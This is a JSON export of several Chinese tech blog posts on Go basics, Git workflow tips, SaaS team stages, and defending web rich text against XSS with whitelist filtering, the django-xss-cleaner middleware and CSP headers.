复合类型\n指针：pointer 数组：array 切片：slice 字典：map 通道：chan 结构体：struct 接口：interface Go 变量标识由字母、数字、下划线组成，其中首字母不能为数字。声明变量时，类型放在变量标识后面。一般形式为：\n1 2 3 4 5 // 单个变量 var identifier type // 多个变量 var identifier1, identifier2 type 声明变量时，如果没有初始化，则默认为零值。对于有初始值的变量声明，可以省略类型，因为 Go 能推导出类型。\n1 2 3 4 var i int = 0 var i = 0 // 还可以省略 var 关键字，使用 := 语法糖声明变量 i := 0 2. Go 的逻辑结构 循环结构 for 1 2 3 for i := 0; i \u0026lt; 10; i++ { sum += i } 1 2 3 4 sum := 0 for sum \u0026lt; 1000 { sum += sum } 条件分支 if、switch 1 2 3 4 5 if x \u0026lt; 0 { return -x } else { return x } 1 2 3 4 5 6 7 8 switch t := i.(type) { case bool: return \u0026#34;I\u0026#39;m a bool\u0026#34; case int: return \u0026#34;I\u0026#39;m an int\u0026#34; default: return \u0026#34;Don\u0026#39;t know type %T\u0026#34;, t } 跳转 goto goto 可以无条件跳转到指定的标签\n1 2 3 4 5 6 if error { goto doError } // 发生错误时，跳过的代码块 doError: // 发生错误时，立即执行的代码块 推迟 defer defer 语句会被压入栈中，当外层函数返回之后，依次出栈执行。\n1 2 3 4 func main() { defer second_run() first_run() } 3. Go 的模块定义 3.1 函数 Go 语言函数定义格式：\n1 2 3 func function_name( [parameter list] ) [return_types] { // 函数体 } func，函数声明关键字 function_name，函数名称，与参数列表一起构成了函数签名 parameter list，参数列表 return_types，返回类型 举个例子：\n1 2 3 4 5 6 7 func max(num1, num2 int) int { if (num1 \u0026gt; num2) { return num1 } else { return num2 } } Go 函数还可以返回多个值：\n1 2 3 func addAndMult(a int, b int) (int, int){ return a + b, a * b } 除此，Go 中还可以声明匿名函数，直接赋值给变量：\n1 2 3 my_func_name := func() { // 函数体 } 3.2 包(package) Go 使用 package 来管理代码，这种方式与 Python 类似。package 是一个或多个 Go 源码文件的集合。Go 语言内置了很多 package，例如 fmt、os、io 等。\n声明包时，在文件第一行添加如下标识：\n1 package package_name 引用时，在文件头部添加如下标识\n1 import \u0026#34;path/package_name\u0026#34; package 的特性：\n一个目录下的同级文件属于一个 package 包名与目录名可以不同，但是通常会保持一致 程序的入口是 main 包的 main 函数，如果没有 main 包，则不会生成可执行文件 仅首字母大写的标识符，包外可以访问 ","description":"","id":383,"section":"post","tags":["博文","Go","一起来学Go","类型","数据结构"],"title":"一起来学 Go --（2）数据与逻辑结构","uri":"https://www.chenshaowen.com/blog/let-us-start-learning-go-2.html"},{"content":"1. XSS 原理和常见的几种攻击方式 XSS 攻击是指，通过执行恶意脚本，以实现窃取用户登陆态、劫持会话等目的的攻击方式。恶意脚本的输入源有，Cookies、Post 表单、Get 请求、HTTP 头内容等。通常，我们将一段 XSS 攻击的代码片段称之为 XSS 向量。\n常见的 XSS 攻击类型有：\n反射型 XSS 。直接将 XSS 向量拼接在 URL 中，诱导用户点击。 存储型 XSS 。通过表单，将 XSS 向量提交到数据库。当页面展示数据时，执行 XSS 向量。 DOM Based XSS 。通过修改浏览页面的 DOM ，绕过防御规则，执行恶意脚本，达到攻击目的。 XSS 攻击的一般路径是：首先找到页面上，文本回显的输入源，然后通过闭合标签，注入可执行的 JavaScript 脚本。\n更多内容可以参考，XSS原理、构造 。\n2. XSS 预防的思路方案 防御 XSS 攻击，主要是对文本内容进行 XSS Filter，阻止恶意脚本的执行。\nXSS 过滤主要有两种模式：黑名单和白名单。\n基于黑名单的 XSS 过滤，将转义或移除黑名单中的标签和属性。 基于白名单的 XSS 过滤，仅允许白名单中的标签和属性存在，其他全部转义或移除。 由于 XSS 的复杂多变，无法穷举全部 XSS 攻击向量，基于黑名单的 XSS Filter 不够安全。而基于白名单的 XSS Filter ，需要穷举允许的全部标签和属性，配置繁琐。这也是为什么 XSS 如此泛滥的原因：没有一个能低成本实施、对用户输入无影响的 XSS 防御方案。\n另外一种预防的方式就是阻止恶意脚本的执行。也就是允许恶意脚本存在，但是不允许其执行。例如，在 Vuejs 中，v-text 指令会将 XSS 向量展示在页面上，不执行 XSS 向量，也就不会触发攻击行为。但是，当允许用户输入样式时，我们会使用 v-html 指令将用户输入的内容显示在页面上。这就可能导致 XSS 攻击。我们需要进一步的防御措施。\n3. XSS 预防的方案 存储型 XSS 能够进行蠕虫攻击，危害极大，是 XSS 预防的重点。在我接触的富文本 XSS 防御方案中，有两种思路：\n前后端穷举有限标签和属性，进行白名单过滤 这种方案，要求用户仅能输入指定、有限的标签和属性。前端可以通过富文本编辑器配置，仅显示指定标签，提升用用户体验。后端不能直接信任前端数据，需要基于白名单再次过滤，推荐使用 bleach 。这样可以保证，入库的数据都是可信任的。如果是 Django 工程，推荐使用 django-xss-cleaner。\n适用场景：简单富文本输入。\n后端转义存储，前端展示时，进行黑名单过滤 实际上，普通用户不会输入 XSS 向量，而攻击者可以很轻松地使用 Postman 或 Burp Suite\n进行安全测试。第二种思路是，完全不信任数据输入，但又不能破坏用户数据。于是，直接将用户输入的数据转义入库，然后反转义输出，保证数据库中的内容是可信任的。展示数据时，前端对展示的内容进行基于黑名单的过滤，推荐使用 js-xss 。\n适用场景：对输入标签范围不定，富文本编辑功能复杂。\n4. CSP 除了在内容上使用 XSSFilter 进行过滤，还可以使用 HttpOnly、CSP 头部进一步预防 XSS 攻击。\nCSP (Content Security Policy) 是用来防御 XSS 的安全策略。CSP 通过白名单控制，仅允许加载指定的资源。这些资源包括 JavaScript, CSS, HTML, Frames, fonts, image, embeddable object, Java applets, ActiveX, audio 和 video 等。\n有两种方法可以启用 CSP :\n设置 HTTP 头信息的 Content-Security-Policy 字段 在网页添加 \u0026lt;meta\u0026gt; 标签 配置示例：\n只允许同源下的资源\n1 Content-Security-Policy: default-src \u0026#39;self\u0026#39;; 允许同源以及指定地址的 JS 资源\n1 Content-Security-Policy: script-src \u0026#39;self\u0026#39; www.google-analytics.com ajax.googleapis.com; 多个资源时，后面的会覆盖前面的\n1 Content-Security-Policy: default-src \u0026#39;none\u0026#39;; script-src \u0026#39;self\u0026#39;; connect-src \u0026#39;self\u0026#39;; img-src \u0026#39;self\u0026#39;; 如果是 Django 工程，推荐使用 django-csp。\n5. 参考 https://github.com/shaowenchen/django-xss-cleaner https://github.com/mozilla/bleach https://github.com/leizongmin/js-xss https://github.com/hinesboy/mavonEditor https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP ","description":"","id":384,"section":"post","tags":["博文","XSS","富文本","安全","Web"],"title":"如何预防 Web 富文本中的 XSS 攻击","uri":"https://www.chenshaowen.com/blog/how-to-prevent-xss-in-web-rich-text.html"},{"content":"django-xss-cleaner 是一个基于 bleach 的 Django XSSFilter 工具包，实现了对 GET 和 POST 请求参数的 XSS 白名单过滤功能。包中内置了部分白名单 HTML 标签、属性设置，同时也支持自定义扩展。项目地址，https://github.com/shaowenchen/django-xss-cleaner\n1. settings.py 安装和配置说明 添加中间件 xss_cleaner.middlewares.CleanXssMiddleware 到 settings 中 1 2 3 4 MIDDLEWARE_CLASSES = ( \u0026#39;xss_cleaner.middlewares.CleanXssMiddleware\u0026#39;, ... ) 建议将 CleanXssMiddleware 放在尽量靠前的位置，最好是第一个。这是为了保证后端获取的数据都通过了 XSS 过滤，避免 XSS 向量被注入。\n配置 Clean XSS 级别 [可选] 默认配置为 \u0026lsquo;HIGHT\u0026rsquo;，可选参数：[\u0026lsquo;LOW\u0026rsquo;, \u0026lsquo;HIGH\u0026rsquo;]\n1 XSS_LEVEL = \u0026#39;HIGH\u0026#39; 如果设置为 ‘HIGHT’ ，允许的标签和属性为\n1 2 3 4 5 6 7 { \u0026#39;tags\u0026#39;: [\u0026#39;a\u0026#39;, \u0026#39;img\u0026#39;, \u0026#39;strong\u0026#39;, \u0026#39;p\u0026#39;, \u0026#39;div\u0026#39;, \u0026#39;span\u0026#39;, \u0026#39;h1\u0026#39;, \u0026#39;h2\u0026#39;, \u0026#39;h3\u0026#39;, \u0026#39;h4\u0026#39;, \u0026#39;h5\u0026#39;, \u0026#39;h6\u0026#39;, \u0026#39;table\u0026#39;, \u0026#39;ul\u0026#39;, \u0026#39;ol\u0026#39;, \u0026#39;tr\u0026#39;, \u0026#39;th\u0026#39;, \u0026#39;td\u0026#39;, \u0026#39;li\u0026#39;], \u0026#39;attributes\u0026#39;: {\u0026#39;a\u0026#39;: [\u0026#39;href\u0026#39;, \u0026#39;title\u0026#39;, \u0026#39;target\u0026#39;], \u0026#39;img\u0026#39;: [\u0026#39;width\u0026#39;, \u0026#39;height\u0026#39;, \u0026#39;src\u0026#39;]}, \u0026#39;styles\u0026#39;: [], \u0026#39;strip\u0026#39;: False, \u0026#39;strip_comments\u0026#39;: False } 如果设置为 \u0026lsquo;LOW\u0026rsquo; ，允许的标签和属性为\n1 2 3 4 5 6 7 8 { \u0026#39;tags\u0026#39;: [\u0026#39;a\u0026#39;, \u0026#39;img\u0026#39;, \u0026#39;br\u0026#39;, \u0026#39;strong\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;code\u0026#39;, \u0026#39;pre\u0026#39;, \u0026#39;p\u0026#39;, \u0026#39;div\u0026#39;, \u0026#39;em\u0026#39;, \u0026#39;span\u0026#39;, \u0026#39;h1\u0026#39;, \u0026#39;h2\u0026#39;, \u0026#39;h3\u0026#39;, \u0026#39;h4\u0026#39;, \u0026#39;h5\u0026#39;, \u0026#39;h6\u0026#39;, \u0026#39;table\u0026#39;, \u0026#39;ul\u0026#39;, \u0026#39;ol\u0026#39;, \u0026#39;tr\u0026#39;, \u0026#39;th\u0026#39;, \u0026#39;td\u0026#39;, \u0026#39;hr\u0026#39;, \u0026#39;li\u0026#39;, \u0026#39;u\u0026#39;], \u0026#39;attributes\u0026#39;: {\u0026#39;a\u0026#39;: [\u0026#39;href\u0026#39;, \u0026#39;title\u0026#39;, \u0026#39;target\u0026#39;], \u0026#39;img\u0026#39;: [\u0026#39;width\u0026#39;, \u0026#39;height\u0026#39;, \u0026#39;src\u0026#39;, \u0026#39;alt\u0026#39;], \u0026#39;*\u0026#39;: [\u0026#39;class\u0026#39;, \u0026#39;style\u0026#39;]}, \u0026#39;styles\u0026#39;: [], \u0026#39;strip\u0026#39;: False, \u0026#39;strip_comments\u0026#39;: False } 参数的含义，在下面会有介绍。\n新增自定义白名单 [可选] 增量式添加新的标签和属性到白名单。\n1 2 3 4 5 6 7 BLEACH_WHITE_LIST = { \u0026#39;tags\u0026#39;: [], \u0026#39;attributes\u0026#39;: {}, \u0026#39;styles\u0026#39;: [], \u0026#39;strip\u0026#39;: False, \u0026#39;strip_comments\u0026#39;: False } 参数说明：\ntags (list) – 允许的标签，不在白名单的标签被转义 attributes (dict) – 允许的属性，不在白名单的属性被删除 styles (list) – 允许的样式，不在白名单的样式被删除 strip (bool) – 是否剔除转义后的字符 strip_comments (bool) – 是否剔除 HTML comments BLEACH_WHITE_LIST 中的标签、属性、样式，将会以增量的形式增加在 Clean XSS 级别允许的白名单上。如果设置了 strip、strip_comments ，将覆盖默认设置。\n是否打印或记录转义 [可选] 为了方便调试，记录 XSS Filter 的信息，提供一个开关:\n1 BLEACH_SHOW = True 默认值为 True，可选值为 [True ，False]\n如果是本地开发，转换日志将直接 print 在 Console。如果是线上，将打印为 warning 日志。\n2. xss_cleaner 豁免装饰器 xss_cleaner 包提供了两个装饰器，用于豁免 XSS Filter 处理。\nescape_clean，提供 View 级别的豁免。 1 2 3 4 5 from xss_cleaner.decorators import escape_clean @escape_clean def home(request): pass escape_clean_param，提供参数级别的豁免。 1 2 3 4 5 from xss_cleaner.decorators import escape_clean_param @escape_clean_param(\u0026#39;param1\u0026#39;, \u0026#39;param2\u0026#39;) def home(request): pass 3. xss_cleaner 处理示例 下面使用的是默认配置： XSS_LEVEL= ‘HIGH\u0026rsquo;\n1 2 3 4 5 6 7 8 9 10 11 转义非白名单标签 XSS Clean: Transfer \u0026lt;b\u0026gt;\u0026lt;i\u0026gt;an example\u0026lt;/i\u0026gt;\u0026lt;/b\u0026gt; To \u0026amp;lt;b\u0026amp;gt;\u0026amp;lt;i\u0026amp;gt;an example\u0026amp;lt;/i\u0026amp;gt;\u0026amp;lt;/b\u0026amp;gt; 删除非白名单样式 XSS Clean: Transfer \u0026lt;p class=\u0026#34;foo\u0026#34; style=\u0026#34;color: red; font-weight: bold;\u0026#34;\u0026gt;blah blah blah\u0026lt;/p\u0026gt; To \u0026lt;p\u0026gt;blah blah blah\u0026lt;/p\u0026gt; 删除非白名单属性 XSS Clean: Transfer \u0026lt;img click=\u0026#34;de\u0026#34; alt=\u0026#34;an example\u0026#34; width=500\u0026gt; To \u0026lt;img width=\u0026#34;500\u0026#34;\u0026gt; 自动补全，规范化 HTML XSS Clean: Transfer \u0026lt;a href=http://abc.com\u0026gt;my text; a b b To \u0026lt;a href=\u0026#34;http://abc.com\u0026#34;\u0026gt;my text; a b b\u0026lt;/a\u0026gt; 下面使用的是默认配置： XSS_LEVEL= LOW\u0026rsquo;\n1 2 3 4 5 6 7 8 9 10 11 转义非白名单标签 XSS Clean: Transfer \u0026lt;b\u0026gt;\u0026lt;i\u0026gt;an example\u0026lt;/i\u0026gt;\u0026lt;/b\u0026gt; To \u0026lt;b\u0026gt;\u0026amp;lt;i\u0026amp;gt;an example\u0026amp;lt;/i\u0026amp;gt;\u0026lt;/b\u0026gt; 删除非白名单样式 XSS Clean: Transfer \u0026lt;p class=\u0026#34;foo\u0026#34; style=\u0026#34;color: red; font-weight: bold;\u0026#34;\u0026gt;blah blah blah\u0026lt;/p\u0026gt; To \u0026lt;p class=\u0026#34;foo\u0026#34; style=\u0026#34;\u0026#34;\u0026gt;blah blah blah\u0026lt;/p\u0026gt; 删除非白名单属性 XSS Clean: Transfer \u0026lt;img click=\u0026#34;de\u0026#34; alt=\u0026#34;an example\u0026#34; width=500\u0026gt; To \u0026lt;img alt=\u0026#34;an example\u0026#34; width=\u0026#34;500\u0026#34;\u0026gt; 自动补全，规范化 HTML XSS Clean: Transfer \u0026lt;a href=http://abc.com\u0026gt;my text; a b b To \u0026lt;a href=\u0026#34;http://abc.com\u0026#34;\u0026gt;my text; a b b\u0026lt;/a\u0026gt; 4. 参考 https://github.com/shaowenchen/django-xss-cleaner ","description":"","id":385,"section":"post","tags":["博文","XSS","Django","安全"],"title":"django-xss-cleaner","uri":"https://www.chenshaowen.com/blog/django-xss-cleaner.html"},{"content":"作者: 王建国/吴斌\n出版年: 2016-11-1\nISBN: 9787508668024\nNotes:\n书中主要想阐述，在互联网时代更适合在家工作，远程协同办公。由此，继续讨论企业主、工作者如何驾驭这种工作模式，作者提出了一些自己的思考。\n书中的观点，可以作为一个思考社会变革的角度。实际上，我本人也强烈感受到整个世界、特别是中国，正在急剧地变化，希望能有切入点投身其中。\n","description":"","id":386,"section":"post","tags":["书籍","形式","云","工作"],"title":"云工作时代","uri":"https://www.chenshaowen.com/blog/book/cloud-work-era.html"},{"content":"1. Go 语言产生的背景 C/C++ 的发展速度没有跟上计算机发展的脚步，十多年来也没有出现一门与时代相符的主流系统编程语言。为了解决这一问题，Google 开发了一门新的编程语言 \u0026ndash; Go 。\nGoogle 当时的现状：\n项目中主要使用C++，也有 Java 和 Python 开发人员众多 代码量大 分布式编译 服务器数量达百万级别 Google 当时面临的问题：\n编译慢 依赖复杂 每个工程师只用了一个语言的一部分特性 代码难以维护，可读性差，文档不清晰 变更功能的成本越来越大 交叉编译困难 Google 设计 Go 的初衷是为了消除各种缓慢和笨重、改进各种低效和扩展。Go 主要面向的是开发大型系统的人，强调解决工程问题。\n2007 年 Google 发起 Go 项目，2009 年开源项目，2012 年发布第一个正式版本，之后每半年一个版本。在 Google 内部，一开始 Go 作为一个 20% 的项目运作，也就是员工利用 20% 的空余时间来参与开发。\nGo 项目的三位主要领导者对系统编程语言、操作系统和并行都有着深刻理解：\nRob Pike，Unix、UTF-8、Plan9 的作者 Ken Thompson，B语言、C语言的作者、Unix之父。 Robert Griesemer，参与开发 JavaScript 执行引擎 V8，Java HotSpot 虚拟机等。 这样强大的创始团队阵容，再加上 Google 制造的光环 ，给 Go 项目带来了极高的人气。\n2. Go 语言的适用场景 Go 适用的一些场景：\n服务器编程，处理日志、数据打包、虚拟机处理、文件系统等 分布式系统，数据库代理、中间件等 网络编程，Web 应用、API 应用、下载应用、游戏后端等 海量存储，Influxdb、Tidb 等 云平台，CloudFoundry 等 使用 Go 的国外公司有 Google、Docker、Apple、Cloud Foundry、CloudFlare、Couchbase、CoreOS、Dropbox、MongoDB、AWS 等。\n使用 Go 的国内公司有头条、阿里云 CDN、百度、小米、七牛、PingCAP、华为、金山软件、猎豹移动、饿了么等。\n3. Go 语言的特点 Go，又称 Golang，是 Google 开发的一种静态强类型、编译型，并发型，并具有垃圾回收功能的编程语言。Google 的很多工程师都是 C 系的，所以 Go 和 C++、Java 、C# 一样属于 C 系。\n在声明和包的设计方面，Go 受到 Pascal、Modula 和 Oberon 系语言的影响；在并发原理的设计上，Go 从同样受到 Tony Hoare 的通信序列进程 CSP 理论影响的 Limbo 和 Newsqueak 的实践中借鉴了一些经验，并使用了和 Erlang 类似的机制。\nGo 语言的优点：\n部署简单，编译之后是一个静态可执行文件，除了 glibc ，没有其他外部依赖 并发性好，Goroutine 和 Channel 从语言层面支持并发，编写高并发的应用不需要考虑锁机制，以及由此带来的各种问题 良好的语言设计，自带完善的工具链，例如 gofmt 可自动排版代码 执行性能良好，适合编写瓶颈业务，非常节省内存 丰富的标准库，内置大量的库，可以直接使用 ","description":"","id":387,"section":"post","tags":["博文","Go","一起来学Go","背景"],"title":"一起来学 Go --（1）背景与特点","uri":"https://www.chenshaowen.com/blog/let-us-start-learning-go-1.html"},{"content":" 我所在的小组，负责 SaaS 开发，有几个重点 SaaS ，也有一些支撑性的 SaaS 。重点 SaaS 架构复杂、技术挑战大，人力投入多，是 KPI 的重点。但重点项目不可能一直是重点，项目有生命周期，也有阶段性。疲于需求，没有远期规划，是危险的。既有战术，也有战略，才会走得更远。本文是关于 SaaS 开发团队阶段的一些思考。\n1. 黄金时代 - SaaS 就是业绩 相较于 IaaS 和 PaaS，SaaS 更贴近用户场景，可以直接创造商业价值。比如，CRM，管理销售；OA，企业协作沟通。\n小企业聚焦核心业务，压缩其他部分的成本。如果 IT 人员能够找到一些低费用甚至免费的 SaaS ，无疑是最好的。既能满足业务需求，又没有运维成本。\n经营数据、对外服务，是企业的核心资产。随着企业的成长，构建自己的 IT 一体化系统是必经之路。企业内部会产生各种开发、部署、运营需求和流程规范，这都需要 IT 人员支撑。\n实际上，无论是开发、运维、运营，都会有一些重复性很高、操作风险很大、还很费时间的事务。这正是 SaaS 的发展机会。我们可以将 CI、CD、CO ，固化到 SaaS ，通过软件保障流程的可靠、低成本执行。\n这就是 SaaS 的黄金时代。倡导工具文化，将技能通过工具的形式，对外输出，提供服务。SaaS 替代了人工繁琐易错的流程操作，提高了团队的效率，提升了服务质量。\n无论在什么岗位，能从无到有，开发 SaaS ，提供公共服务的团队都会得到重视。\n2. 逐步没落 - PaaS 平台崛起，SaaS 外包 经历了黄金时代之后，各种 SaaS 遍地开花。由于使用场景不同，SaaS 工具很难有统一的开发规划。SaaS 与 SaaS 之间数据不通、流程不同，形成壁垒，割裂了各种 IT 系统。\n其实，大家能察觉到这个问题，但涉及到利益分配，无法达成一致。这需要更上层来推动。解决办法无非就是，分久必合合久必分。我们需要打造一个公共的平台，让所有的 SaaS 有一个公共的运行和依赖环境。\n通过 aPaaS 提供 SaaS 运行托管服务，通过 iPaaS 聚合场景 API，打造 PaaS 平台。建设平台的难点在于打造生态。就像开发操作系统，研发环节并不是最难的，最难的是如何让大家在上面开发应用。\n从最初 SaaS 帮团队撑下局面，到开始运营 PaaS 生态，官方 SaaS 逐渐落下帷幕。SaaS 的场景是无限延伸的，PaaS 的服务是收敛的。官方 SaaS 是为了吸引用户，最终将用户导向平台，进行自主开发。投入人力，打造 PaaS 是更有价值的。\n构建生态，就是要形成上下游的利益关系，互利共赢。PaaS 平台需要更多外部 SaaS 开发者来繁荣生态。外部 SaaS 开发者需要 PaaS 提供更多、更好的公共服务，用以提高产出投入比。PaaS、外部 SaaS 开发者各取所需，其乐融融。\n这时的 SaaS 开发，更像是外包，帮助生态中的开发者，补足场景，陪伴外部开发者成长。\n3. 缓慢爬坡 - 输出全周期解决能力 官方 SaaS 开发团队是最了解平台的。SaaS 向上贴近用户，向下贯穿整个平台。这是 SaaS 开发团队的优势。除此，官方 SaaS 团队支撑各类场景需求，经历产品的完整生命周期，积累了丰富的经验。这些都可以对外输出，给其他 SaaS 开发者。\n输出全周期解决能力，就是针对不同发展阶段的团队，提供不同阶段的指导。\n开发模型，软件架构，编码规范，人员培训，运营管理，团队协作，技术栈，工具链等，SaaS 生命周期中出现过的内容都可以作为指导维度。\n有了各种维度的积累，还需要针对不同规模，不同开发能力，不同业务场景的团队进行整体方案性的输出。记录、总结 SaaS 团队演化过程尤为重要。\n在输出全周期解决方案的过程中，SaaS 团队主要目标不是开发，而是输出经验，积累影响力。进一步，还可以输出 SaaS 评级模型，向行业的更上游发展，从运动员转型为裁判员。\n4. 稳步增长 - 低代码平台 既然平台是工具团队的目标，不如 SaaS 团队也去打造平台，顺势而为。\n打造平台有两种思路，第一种是让 SaaS 沉下去，第二种是发现价值再造一个中间层。\nSaaS 需要对其服务领域有着深入的理解，将能力输出给其他 SaaS，可以是 API，也可以是内嵌页面。越多的 SaaS 愿意集成，意味着下沉得越多，越体现其价值。下沉的 SaaS，也为第二种思路提供了原材料。\nSaaS 团队直接服务于用户，产品不好可以慢慢打磨，最重要的是快速响应用户需求。快，可以构成 SaaS 开发团队的核心竞争力。SaaS 团队不仅要开发速度快，还需要将这种快速开发能力输出给其他开发者。\n在输出全周期解决能力阶段，就会对快速构建 SaaS 有一定实践的积累。我认为，再好的流程和建议都不如提供一个工具。辅助开发者，快速构建 SaaS 的工具，就可以打造成一个平台。\n这个平台更通用的名称是，低代码平台。低代码平台允许开发者通过少量编码，完成复杂的功能需求，大幅提高开发效率、降低开发成本。SaaS 开发团队摆脱开发需求，转向平台沉淀。\n","description":"","id":388,"section":"post","tags":["博文","思考","团队","SaaS"],"title":"SaaS 开发团队的不同阶段","uri":"https://www.chenshaowen.com/blog/different-stages-of-the-saas-development-team.html"},{"content":"1. Pages 功能 GitHub、GitLab、Bitbucket 等，都提供了免费的静态页面托管服务，称之为 Pages 。利用 Pages 服务，可以发布文档、博客等。\n以 GitHub 为例，通常只需要简单几个步骤，就可以使用 Pages：\n新建一个项目：[username].github.io 提交静态 html 文件 访问 [username].github.io，也可以绑定自己的域名进行访问。 如果你想要使用 Markdown 编辑文档，那么就需要借助 Jekyll、Hexo 等静态页面生成工具。\n2. Git hooks Git hooks 是 Git 仓库在特定事件被触发时，自动执行的一系列脚本。通过关联特定的事件，可以达到自定义工作流的目的。\nGit 将 hooks 脚本存储在仓库的 .git/hooks 目录下。\n1 2 3 4 ls .git/hooks/ applypatch-msg.sample\tpost-update.sample\tpre-push.sample\tprepare-commit-msg.sample commit-msg.sample\tpre-applypatch.sample\tpre-rebase.sample\tupdate.sample fsmonitor-watchman.sample\tpre-commit.sample\tpre-receive.sample 钩子分为客户端和服务器端。客户端关联本地事件，服务器端关联服务器事件。\n客户端的钩子有：\npre-commit，在提交信息前运行。推荐一个工具，提供了大量相关插件，pre-commit。 prepare-commit-msg，在启动提交信息编辑器之前，默认信息被创建之后运行。 post-commit，在整个提交过程完成后运行。 applypatch-msg，可以用该脚本来确保提交信息符合格式，或直接用脚本修正格式错误。 pre-applypatch，在 git am 运行期间被调用。 post-applypatch，运行于提交产生之后，是在 git am 运行期间最后被调用的钩子。 pre-rebase，运行于变基之前，以非零值退出可以中止变基的过程。 post-rewrite，被那些会替换提交记录的命令调用。 post-checkout，在 git checkout 成功运行后调用。 post-merge，在 git merge 成功运行后调用。 pre-push，在 git push 运行期间， 更新了远程引用但尚未传送对象时被调用。 pre-auto-gc，会在垃圾回收开始之前被调用，可以用它来提醒你现在要回收垃圾了，或者依情形判断是否要中断回收。 服务器端的钩子有：\npre-receive，处理来自客户端的推送操作时，被调用。 update，为每一个准备更新的分支各运行一次。 post-receive，在整个过程完结以后运行，可以用来更新其他系统服务或者通知用户。 另外，通常 Git 仓库页面上，可以注册回调 URL hooks，用于触发某些事件，比如 Jenkins 的流水线。\n3. CI/CD 除了上面提到的 Git hooks，还可以通过 yaml 更灵活地定义 CI/CD 流程。而你只需要理解 stage、job 等 CI/CD 概念，编写简单的 shell。\n更多相关内容，可以参考 常用的一些 CI 脚本。\n3.1 GitHub CI Travis CI 是一个基于云的持续集成项目，目前已经支持大部分主流语言，如：C、PHP、Ruby、Python、Nodejs、Java、Objective-C 等。\n使用时，主要分成两步：\n使用 GitHub 账户登陆 TravisCI 在 GitHub 仓库新增 .travis.yml 文件 1 2 3 4 5 language: node_js node_js: - \u0026#39;7.5.0\u0026#39; before_script: npm install script: npm run dev 3.2 GitLab CI Gitlab Runner 是 GitLab 提供的 CI 执行器。GitLab 官方提供了限时长的免费 Runner，也允许用户自助接入服务器作为项目的 Runner。\n使用时，不需要借助第三方，直接在仓库中增加 .gitlab-ci.yml ：\n1 2 3 4 5 6 7 8 9 10 11 12 # 一些前置脚本，完成激活环境等操作 before_script: - source /data/runner/node/bin/activate - which node \u0026amp;\u0026amp; node --version - which npm \u0026amp;\u0026amp; npm --version - LANG=\u0026#34;zh_CN.utf8\u0026#34; - export LC_ALL=zh_CN.UTF-8 # 编排需要执行的 stage stages: - build - deploy 更多相关内容，可以参考 GitLab CI 配置 Runner。\n4. GPG 验证提交 Git 是一个分布式的版本管理系统。每个人都有一份仓库的副本，每个人都在自己的分支上开发，然后合并到主分支。这样可能会导致某些恶意提交，原因可能是某位开发者的账号被盗、服务器漏洞等。\n人与人之间的信任，需要传导到仓库之间。因此，我们需要 GPG，一种信息加密、验证机制。\nGitHub 上使用 GPG 主要步骤：\n安装 GPG 1 brew install gnupg gnupg2 生成 GPG keys，拿到 [密钥ID] 1 gpg --full-generate-key 输出密钥 1 2 gpg --list-keys gpg --armor --output public-key.txt --export [密钥ID] 上传 public-key 到 GitHub 在 Settings 页面，点击 SSH and GPG keys，在 GPG keys 那里，点击 New GPG key。在输入框里填入 public-key.txt 内容，保存即可。\n本地 Git 配置 1 2 git config --global user.signingkey [密钥ID] git config --global commit.gpgsign true 配置完毕，以后提交代码时，每条提交记录都会显示一个绿色的 Verified 标签。\n需要注意的是保持 git config --global user.name 和 git config --global user.email 与上面生成 GPG Key 时一致。\n5. Git 工作流 通过 Git 对项目进行分支开发，建立的工作流程称之为 Git Flow。 Git 主要有三种工作流：\nGit flow 长期存在两个分支：主分支 master 和 开发分支 develop。适合发布流程比较长的项目，比如 Apple App Store 应用。\nGitHub flow 只有一个长期存在的 master 主分支。适合持续集成，更新迭代快的项目，典型的互联网项目特征。\nGitLab flow Git flow 和 GitHub flow 的结合体。采用上游优先的原则，master（上游）修改的代码会同步到其他分支（下游），比如 chromium 开发，不同开发商在不同分支开发，但是服务商会不定期合并 master 代码。\n更多相关内容，可以参考 敏捷开发之研发流程。\n6. Merge/Pull Request 在采用了 Git 工作流之后，需要采用 Merge/Pull Request 的方式进行多人开发。\n通常，我们会在 Merge/Pull Request 流程中做 Code Review。Merge/Pull Request 流程是保证模块正确耦合、高质量代码的关键。\n另外，Merge/Pull Request 还可以关联 issues，例如: close #33，当 Merge/Pull Request 被 Merge 时，相应的 issues 就会被自动关闭。\n更多相关内容，可以参考 基于 Git 的前后端开发工作流、如何更好做 CodeReview。\n7. 使用 issues 进行项目管理 除了管理代码仓库版本，Git 中的 issues 还可以用于项目管理。\nissues 指的是一项待完成的工作，可以是缺陷、功能建议、规划中的功能等。\nissues 只是列出了一系列工作事项，Git 提供了 label、milestone、board 对 issues 进行多维度的管理功能。\nlabel 主要用于对 issues 分类、过滤。\nmilestone 主要用于定制计划，一个 issues 只能绑定一个milestone。\nboard 提供的看板功能，可以直观看到工作事项、项目进度。\n更多相关内容，可以参考 如何使用 python-gitlab 自动创建 GitLab Label。\n8. 定制 issues 或者 pull request 模板 在使用 issues 对项目进行管理时，规范化 issues 模板，让提交者尽可能准确描述问题，是十分有必要的。\nGit 提供这样的模板功能。\n以 GitHub 为例，在代码仓库新建目录：.github。你可以添加单个模板，也可以添加多个模板。\n添加单模板 在 .github 目录下添加 ISSUE_TEMPLATE.md 文件作为 issues 默认模版。\n添加多模板 在代码仓库新建目录：.github/ISSUE_TEMPLATE。该目录下可添加多个 .md 文件作为 issues 模版。\npull request 模版 和 issues 模板类似，只是文件或文件夹名称改为了 PULL_REQUEST_TEMPLATE。\n9. Git 分支的目录管理 Git 的分支就是在 .git/refs/heads 目录下的一个文件，文件内容指向某一条 Git 记录。\n在实践主干集成、分支开发的过程中，通常会产生大量分支。使用目录可以很好地对 Git 分支进行管理。目录分支与普通的分支一样，只不过分支名带了目录分割符 / 。\n1 2 3 4 5 6 7 8 git branch *bugfix/1/1 feature/2/1 hotfix/3/1 release/4/1 custom/5/1 master 在有些 Git 工具中，可以以目录的形式展示分支，例如：SourceTree、BitBucket 。\n","description":"","id":389,"section":"post","tags":["博文","技巧","Git","流程"],"title":"你不知道的 Git 使用技巧","uri":"https://www.chenshaowen.com/blog/git-skills-you-do-not-notice.html"},{"content":"1. 正在急剧变革的 IT 设施 传统的企业，正在基于互联网技术，构建更加高效的商业模式，以加强自身在行业的竞争力。更低的研发成本、更快的产品迭代、更近的客户距离、更好的服务质量\u0026hellip; 这一系列的变化，将推动整个社会的生产效率、生活水平迈上新的台阶。\n在 ToC 的互联网红利消耗殆尽之时，ToB 